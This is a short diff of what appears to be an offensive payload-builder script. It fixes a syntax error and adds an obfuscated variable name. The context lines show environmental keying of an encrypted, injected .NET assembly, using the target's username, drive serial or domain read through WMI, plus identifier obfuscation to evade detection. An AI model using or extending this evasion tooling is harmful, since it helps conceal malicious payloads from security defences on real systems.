@@ -88,7 +88,7 @@ try:
         if args.username:
             key = args.username
             query = "((Get-WmiObject -Class Win32_ComputerSystem).username).split('\\')[1]"
-        if args.driveserial
+        if args.driveserial:
             key = args.driveserial
             query = "(Get-WmiObject win32_physicalmedia | ft SerialNumber -HideTableHeaders | Select -First 3 | Out-String).Trim()"
 
@@ -179,7 +179,7 @@ try:
         encrypted = Encrypter.encrypt1(payload, key)
         # Obfuscate variable and function names
         Obfuscator = Obfuscator()
-        encDllB64, encDllBytes, newIV, envKey, keyBytes, plaintext, InjectAssembly, key, iv, cyphertext, rijAlg, strBytes, assembly, method = Obfuscator.varobfs()
+        hWindow, encDllB64, encDllBytes, newIV, envKey, keyBytes, plaintext, InjectAssembly, key, iv, cyphertext, rijAlg, strBytes, assembly, method = Obfuscator.varobfs()
         if args.domain:
             check = "System.Net.NetworkInformation.IPGlobalProperties.GetIPGlobalProperties().DomainName"
         elif args.user:
